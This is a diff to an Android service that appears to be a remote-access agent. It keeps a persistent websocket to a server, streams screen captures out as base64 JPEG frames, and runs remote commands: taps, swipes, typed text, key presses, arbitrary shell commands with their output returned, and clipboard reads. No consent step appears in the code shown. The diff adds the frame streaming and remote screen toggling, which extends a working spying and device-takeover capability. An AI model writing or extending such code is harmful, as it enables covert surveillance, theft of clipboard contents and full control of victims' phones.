@@ -1,14 +1,17 @@
 package com.arpit.access;
 
+import android.accessibilityservice.AccessibilityService;
 import android.app.*;
+import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
 import android.os.*;
-import android.provider.Settings;
 import android.util.Base64;
 import okhttp3.*;
 import org.json.JSONObject;
-import java.io.*;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.InputStreamReader;
 import java.util.concurrent.TimeUnit;
 
 public class AgentService extends Service {
@@ -55,27 +58,49 @@ public class AgentService extends Service {
 
     @Override public int onStartCommand(Intent i, int f, int s) {
         if (ws == null) connect();
-        if (projectionData != null && !Agent.screenOn) {
-            new Handler(Looper.getMainLooper()).postDelayed(this::boot, 1200);
-        }
+        if (streamer == null) new Handler(Looper.getMainLooper()).postDelayed(this::boot, 1200);
         return START_STICKY;
     }
 
     private void boot() {
+        if (streamer != null) return;
+
         if (projectionData == null) {
             startActivity(new Intent(this, ConnectActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
             return;
         }
+
         Point sz = new Point();
         try { ((android.view.WindowManager) getSystemService(WINDOW_SERVICE)).getDefaultDisplay().getRealSize(sz); } catch (Exception e) {}
         if (sz.x > 0) { Agent.W = sz.x; Agent.H = sz.y; }
-        Agent.screenOn = true;
+
         streamer = new ScreenStreamer(this, (jpeg, w, h) -> {
             long now = System.currentTimeMillis();
-            if (now - lastFrameSent < 120) return;
+            if (now - lastFrameSent < 130) return;
             lastFrameSent = now;
-            send(new JSONObject().toString());
+            try {
+                JSONObject o = new JSONObject();
+                o.put("t", "frame");
+                o.put("d", Base64.encodeToString(jpeg, Base64.NO_WRAP));
+                o.put("w", w);
+                o.put("h", h);
+                send(o.toString());
+            } catch (Exception ignored) {}
         }, 45);
+
+        streamer.setGap(130);
+
+        if (streamer.start()) {
+            Agent.screenOn = true;
+        } else {
+            streamer = null;
+            Agent.screenOn = false;
+        }
+    }
+
+    private void stopScreen() {
+        if (streamer != null) { streamer.stop(); streamer = null; }
+        Agent.screenOn = false;
     }
 
     /* ---------- ws ---------- */
@@ -83,6 +108,7 @@ public class AgentService extends Service {
         http = new OkHttpClient.Builder()
                 .pingInterval(25, TimeUnit.SECONDS)
                 .connectTimeout(15, TimeUnit.SECONDS)
+                .readTimeout(0, TimeUnit.MILLISECONDS)
                 .build();
 
         Request req = new Request.Builder().url(Agent.WS_URL).build();
@@ -99,7 +125,10 @@ public class AgentService extends Service {
         new Handler(Looper.getMainLooper()).postDelayed(() -> { if (ws == null) connect(); }, 6000);
     }
 
-    private void send(String s) { if (ws != null) ws.send(s); }
+    private void send(String s) {
+        if (ws == null) return;
+        try { ws.send(s); } catch (Exception ignored) {}
+    }
 
     private void hello() {
         try {
@@ -136,17 +165,34 @@ public class AgentService extends Service {
             int id = m.optInt("id");
 
             switch (op) {
-                case "tap": TouchService.tap((float) (m.getDouble("x") * Agent.W), (float) (m.getDouble("y") * Agent.H)); break;
-                case "long": TouchService.longPress((float) (m.getDouble("x") * Agent.W), (float) (m.getDouble("y") * Agent.H)); break;
-                case "swipe": TouchService.swipe(
-                        (float) (m.getDouble("x1") * Agent.W), (float) (m.getDouble("y1") * Agent.H),
-                        (float) (m.getDouble("x2") * Agent.W), (float) (m.getDouble("y2") * Agent.H),
-                        m.optLong("ms", 260)); break;
-                case "text": if (!TouchService.type(m.optString("s"))) shell("input text " + m.optString("s").replace(" ", "%s")); break;
-                case "key": key(m.optString("code")); break;
-                case "screen": break;
-                case "shell": reply(id, shell(m.optString("s"))); break;
-                case "clip": reply(id, clip()); break;
+                case "tap":
+                    TouchService.tap((float) (m.getDouble("x") * Agent.W), (float) (m.getDouble("y") * Agent.H));
+                    break;
+                case "long":
+                    TouchService.longPress((float) (m.getDouble("x") * Agent.W), (float) (m.getDouble("y") * Agent.H));
+                    break;
+                case "swipe":
+                    TouchService.swipe(
+                            (float) (m.getDouble("x1") * Agent.W), (float) (m.getDouble("y1") * Agent.H),
+                            (float) (m.getDouble("x2") * Agent.W), (float) (m.getDouble("y2") * Agent.H),
+                            m.optLong("ms", 260));
+                    break;
+                case "text":
+                    if (!TouchService.type(m.optString("s")))
+                        shell("input text " + m.optString("s").replace(" ", "%s"));
+                    break;
+                case "key":
+                    key(m.optString("code"));
+                    break;
+                case "screen":
+                    if (m.optBoolean("on", true)) boot(); else stopScreen();
+                    break;
+                case "shell":
+                    reply(id, shell(m.optString("s")));
+                    break;
+                case "clip":
+                    reply(id, clip());
+                    break;
             }
         } catch (Exception ignored) {}
     }
@@ -192,17 +238,20 @@ public class AgentService extends Service {
     private void reply(int id, String data) {
         try {
             JSONObject o = new JSONObject();
-            o.put("t", "res"); o.put("id", id); o.put("ok", true); o.put("data", data);
+            o.put("t", "res");
+            o.put("id", id);
+            o.put("ok", true);
+            o.put("data", data);
             send(o.toString());
         } catch (Exception ignored) {}
     }
 
     @Override public void onDestroy() {
-        if (streamer != null) streamer.stop();
+        stopScreen();
         if (ws != null) ws.close(1000, "bye");
         self = null;
         super.onDestroy();
     }
 
     @Override public IBinder onBind(Intent i) { return null; }
-              }
+            }
